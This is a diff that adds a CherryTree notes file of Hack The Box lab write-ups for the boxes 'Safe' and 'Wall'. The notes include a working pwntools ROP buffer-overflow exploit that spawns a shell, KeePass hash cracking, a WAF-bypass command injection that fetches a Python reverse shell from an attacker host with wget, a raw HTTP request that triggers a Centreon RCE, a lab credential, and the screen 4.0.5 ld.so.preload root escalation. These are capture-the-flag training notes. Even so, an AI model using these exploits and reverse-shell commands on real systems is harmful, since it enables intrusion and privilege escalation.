@@ -1,0 +1,101 @@
+<?xml version="1.0" ?>
+<cherrytree>
+	<node custom_icon_id="0" foreground="" is_bold="False" name="Safe" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570664515.38" ts_lastsave="1571320108.78" unique_id="1">
+		<rich_text></rich_text>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="Interesting" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1571319082.89" ts_lastsave="1571319084.3" unique_id="3">
+			<rich_text>port 1337 is running a binary.
+Binrary can be downloaded for analysis
+
+**Always check the source of the page. Always!!!
+</rich_text>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="User" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1571319136.36" ts_lastsave="1571320017.98" unique_id="7">
+			<rich_text>-- When we download binary we see it is x86_64 i.e 64-bit binary. 
+-- We know that 64 bit binaries use the gadgets(registers) to push arguments on the stack.
+-- Use gdb to get the buffer size so that we can find out the buffer overflow position.
+-- We use ROPGadget to find our gadget to find out gadget in which %rdi is getting poopped so that we can put our arguments on the stack. 
+-- We need to find an address in the binary which is writable. As the system binary is already loaded we can use it to get the shell by passing the arguments /bin/sh. 
+-- We use pwndbg&gt; vmmap to find out a region which has --rw (read/write) access. The address is from 0x404000 to 0x405000. We use telescope function to find out the address which is not referenced in the variable. We select any of these addresses.
+-- Since we control the gets we can get it's address and redirect to our gadget address and then pass it to the writeable section of binary so that ouir argument is passed.
+-- Next we get the system address and redirect the pointer to the system binary without knowing the address.
+-- Next we pass the payload and the pass the string to system - /bin/sh
+
+from pwn import *
+context.binary = &quot;/root/Desktop/HTB/boxes/Safe/exploit-dev/myapp&quot;
+elf = context.binary
+payload = &quot;A&quot; *120
+
+#0x000000000040120b : pop rdi ; ret
+
+payload += p64(0x000000000040120b)
+payload += p64(0x404080)
+payload += p64(elf.plt[&quot;gets&quot;])
+payload += p64(0x000000000040120b)
+payload += p64(0x404080)
+payload += p64(elf.plt[&quot;system&quot;])
+
+s=remote(&quot;10.10.10.147&quot;,1337)
+s.sendline(payload)
+s.sendline(&quot;/bin/sh&quot;)
+s.interactive()
+
+-- After getting the shell we can add our authorized keys to .ssh using ssh-keygen
+-- SSH to the “user” user. </rich_text>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="Root" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1571320108.78" ts_lastsave="1571320110.2" unique_id="8">
+			<rich_text>-- After getting SSH we get some images and .kdbx file, which is a keepass 2.x db backup.
+-- We see that it can be cracked so we convert it to hash using keepass2john.py &lt;kdbx-file&gt; , but with no luck. 
+-- After research we find that we can pass the key file with master password to lock the db. 
+-- There is a switch in /usr/sbin/keepass2john to give key files. (-k)
+-- So we use all the images files as the keys and try to generate the hash. We pass the 6 hashes in the hashcat and wait for it to crack.
+-- Hashcat cracks the hash 0547 and then we can pass the IMG file in keepass2 tool to find out the root password. 
+-- Then we can use the su root to get to root.</rich_text>
+		</node>
+	</node>
+	<node custom_icon_id="0" foreground="" is_bold="False" name="Wall" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570618813.39" ts_lastsave="1570663489.13" unique_id="1">
+		<rich_text></rich_text>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="Interesting" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570663489.13" ts_lastsave="1570663489.93" unique_id="6">
+			<rich_text>-- changing the GET verb of /monitoring to POST we get a directory /centreon with a login page and a known authenticated RCE.
+
+-- Fix the exploit or do it manually </rich_text>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="Creds" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570618818.94" ts_lastsave="1570663312.75" unique_id="2">
+			<rich_text>centreon UI :admin:password1
+
+</rich_text>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="User" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570663312.75" ts_lastsave="1570664677.25" unique_id="4">
+			<rich_text>Bypassing the WAF was tough.
+-- wget${IFS}http://10.10.14.26:8090/python-rev-shell.py|python${IFS}python-rev-shell.py
+-- write a reverse shell in python and pass it using above command
+-- execute the code to get a reverse shell:-
+
+POST /centreon/include/configuration/configGenerate/xml/generateFiles.php HTTP/1.1
+Host: 10.10.10.157
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: </rich_text>
+			<rich_text link="webs http://10.10.10.157/centreon/main.get.php?p=60902&amp;poller=">http://10.10.10.157/centreon/main.get.php?p=60902&amp;poller=</rich_text>
+			<rich_text>
+Content-Type: application/x-www-form-urlencoded;charset=UTF-8
+Content-Length: 33
+Cookie: PHPSESSID=o8o509tarstdkkumm6ni7ih098
+Connection: close
+X-Requested-With: XMLHttpRequest
+
+poller=1&amp;debug=true&amp;generate=true
+-- after getting reverse shell do basic enum</rich_text>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="Root" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570663321.65" ts_lastsave="1570663325.97" unique_id="5">
+			<rich_text>-- After finding screen-4.0.5 version vulnerable to  priv esc and has suid set we:-
+-- create libhax.so &amp; rootshell
+-- cd /etc
+-- umask 000 # because
+-- screen -D -m -L ld.so.preload echo -ne  &quot;\x0a/tmp/libhax.so&quot; # newline needed
+-- screen -ls # screen itself is setuid, so... 
+-- /tmp/rootshell</rich_text>
+		</node>
+	</node>
+</cherrytree>
